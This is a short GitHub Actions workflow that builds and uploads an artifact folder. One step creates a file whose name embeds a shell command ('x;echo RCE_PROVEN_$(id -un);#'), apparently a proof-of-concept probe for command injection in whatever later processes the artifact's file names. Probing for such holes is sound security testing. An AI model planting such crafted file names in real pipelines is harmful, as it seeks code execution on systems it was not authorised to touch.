name: Test

on:
  workflow_dispatch:
  pull_request:
  push:
    branches: [main]

jobs:
  upload:
    runs-on: ubuntu-latest
    steps:
      - name: build artifact
        run: |
          set -e
          mkdir -p content
          printf 'hello\n' > content/report.txt
          printf 'x\n' > content/x
          printf 'y\n' > 'content/x;echo RCE_PROVEN_$(id -un);#.txt'
      - uses: actions/upload-artifact@v4
        with:
          name: content
          path: content/
